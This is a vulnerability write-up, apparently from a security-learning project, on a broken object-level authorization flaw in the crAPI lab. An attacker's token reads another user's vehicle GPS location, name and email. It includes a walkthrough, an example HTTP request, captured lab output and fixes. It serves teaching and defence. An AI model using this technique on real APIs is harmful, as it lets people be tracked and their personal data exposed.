[🇧🇷 Português](../../vulnerabilidades/01-bola-localizacao-veiculo.md) · 🇺🇸 English

# BOLA — Accessing another user's vehicle location

**OWASP API Security Top 10 (2023) category:** `API1 — Broken Object Level Authorization`
**Severity (CVSS v3.1):** `Medium · 6.5` — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**Matching crAPI challenge:** BOLA / Challenge 1 — "access details of another user's vehicle"

---

## 1. Summary

The API exposes a vehicle's location from its identifier (`vehicleId`), but **does not check whether the vehicle belongs to the authenticated user**. An attacker who discovers someone else's vehicle ID can read that person's GPS location, even while using their own token.

## 2. Preconditions

- The **attacker** account (user B) authenticated, with a valid JWT token.
- The **victim's `vehicleId`** (user A). The IDs are GUIDs (not sequential), so you cannot simply increment a number — you must obtain it from another leak (see [Excessive Data Exposure](03-excessive-data-exposure.md), where forum posts expose other users' vehicle IDs).

## 3. Exploitation walkthrough

1. Authenticate as the attacker and obtain the token (see [environment](../environment-crapi.md)).
2. Obtain the victim's `vehicleId` (for example, via the community posts endpoint).
3. Query the victim's vehicle location using **the attacker's token**:

```http
GET /identity/api/v2/vehicle/{VICTIM_vehicleId}/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer <attacker_token>
```

If the API returns the victim's vehicle coordinates, object-level authorization is broken.

## 4. Evidence

**Confirmed against the local instance** — capture in [`evidencias/01-bola/captura.txt`](../../../evidencias/01-bola/captura.txt).

Using the **attacker's** token against another user's `vehicleId` (obtained via [Excessive Data Exposure](03-excessive-data-exposure.md)):

```
GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location
Authorization: Bearer <attacker_token>

HTTP 200
{"carId":"f89b5f21-...","vehicleLocation":{"latitude":"32.778889","longitude":"-91.919243"},
 "fullName":"Adam","email":"adam007@example.com"}
```

The API returned the **GPS location, name, and email** of a vehicle that does not belong to the attacker.

## 5. Why it is a risk

Vehicle location is sensitive data that physically tracks a person. The flaw allows **spying on the position of any user** whose vehicle ID can be discovered. BOLA is the #1 flaw in the OWASP API Top 10 precisely because it is common, easy to exploit, and high impact: object-level authorization is often forgotten when the backend trusts the ID sent by the client.

## 6. How to fix

- Validate, **on the server**, that the requested object belongs to the authenticated user (compare the vehicle's `owner` with the token's `sub`/ID) before returning any data.
- Centralize the ownership check in a middleware/policy instead of relying on each handler.
- Using unguessable IDs is defense in depth, **not** a replacement for the authorization check.

## 7. References

- [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
